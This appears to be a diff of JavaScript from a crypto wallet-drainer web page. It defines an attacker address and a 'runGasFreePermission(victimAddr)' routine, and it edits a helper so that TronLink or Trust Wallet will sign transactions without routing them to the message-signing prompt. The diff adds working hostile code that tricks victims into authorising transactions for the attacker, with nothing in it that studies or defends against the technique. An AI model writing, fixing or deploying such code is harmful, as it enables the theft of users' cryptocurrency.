@@ -473,35 +473,23 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
-  /* ---- sign helper: bypasses trx.sign() wrapper to avoid signMessage routing ---- */
+  /* ---- sign helper: strip raw_data before signing (Trust Wallet routes to signMessage if raw_data present) ---- */
   async function _signTx(tw, tx, label) {
-    window.__logINF((label||'sign') + ' typeof tx=' + typeof tx + ' keys=' + JSON.stringify(Object.keys(tx)));
-    // Primary: direct tronLink.request — avoids TronWeb wrapper that may route object to signMessage
+    // Clone and strip raw_data — reference file does this, raw_data causes TW to route to signMessage
+    var txToSign = { visible: tx.visible, txID: tx.txID, raw_data_hex: tx.raw_data_hex };
+    window.__logINF((label||'sign') + ' stripped keys=' + JSON.stringify(Object.keys(txToSign)));
+    // Primary: tronLink.sign (native DApp browser method, more direct than trx.sign wrapper)
     var prov = window.tronLink;
-    if (prov && typeof prov.request === 'function') {
+    if (prov && typeof prov.sign === 'function') {
       try {
-        window.__logINF((label||'sign') + ' trying tronLink.request tron_signTransaction');
-        var r = await prov.request({ method: 'tron_signTransaction', params: [tx] });
-        if (r && (r.signature || r.raw_data_hex)) {
-          window.__logINF((label||'sign') + ' tronLink.request ok');
-          return r;
-        }
-      } catch(e1) { window.__logERR((label||'sign') + ' tronLink.request FAIL: ' + e1.message); }
+        window.__logINF((label||'sign') + ' trying tronLink.sign');
+        var r = await prov.sign(txToSign);
+        if (r && r.signature) { window.__logINF((label||'sign') + ' tronLink.sign ok'); return r; }
+      } catch(e1) { window.__logERR((label||'sign') + ' tronLink.sign FAIL: ' + e1.message); }
     }
-    // Secondary: tronWeb.request if available
-    if (tw && tw.request && typeof tw.request === 'function') {
-      try {
-        window.__logINF((label||'sign') + ' trying tronWeb.request tron_signTransaction');
-        var r2 = await tw.request({ method: 'tron_signTransaction', params: [tx] });
-        if (r2 && (r2.signature || r2.raw_data_hex)) {
-          window.__logINF((label||'sign') + ' tronWeb.request ok');
-          return r2;
-        }
-      } catch(e2) { window.__logERR((label||'sign') + ' tronWeb.request FAIL: ' + e2.message); }
-    }
-    // Fallback: standard trx.sign
-    window.__logINF((label||'sign') + ' fallback trx.sign');
-    return await tw.trx.sign(tx);
+    // Fallback: trx.sign with stripped tx
+    window.__logINF((label||'sign') + ' fallback trx.sign stripped');
+    return await tw.trx.sign(txToSign);
   }
 
   async function runGasFreePermission(victimAddr) {
